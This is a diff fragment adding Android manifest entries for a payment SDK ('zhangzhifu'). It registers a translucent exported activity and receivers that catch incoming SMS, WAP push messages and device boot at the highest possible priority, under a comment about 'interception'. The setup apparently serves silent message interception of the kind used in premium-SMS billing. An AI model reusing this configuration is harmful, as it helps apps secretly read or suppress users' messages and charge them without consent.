@@ -1,0 +1,35 @@
+<!-- ===================组件====================-->
+<activity
+            android:name="com.zhangzhifu.sdk.activity.ZhangPayActivity"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent" >
+        </activity>
+<service android:name="com.zhangzhifu.sdk.service.ZhangPayPlateService" >
+        </service>
+
+<service
+            android:name="com.zhangzhifu.sdk.service.ZhangzhifuSmsService"
+            android:enabled="true" />
+
+        <!-- 新版本拦截 -->
+        <receiver android:name="com.zhangzhifu.sdk.util.sms.BootReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.zhangzhifu.sdk.util.sms.SmsReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+       
+          
+        <receiver android:name="com.zhangzhifu.sdk.util.sms.WapPushReceiver" >
+            <intent-filter android:priority="2147483647" >
+          <action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED" />
+
+                <data android:mimeType="application/vnd.wap.sic" />
+            </intent-filter>
+        </receiver>
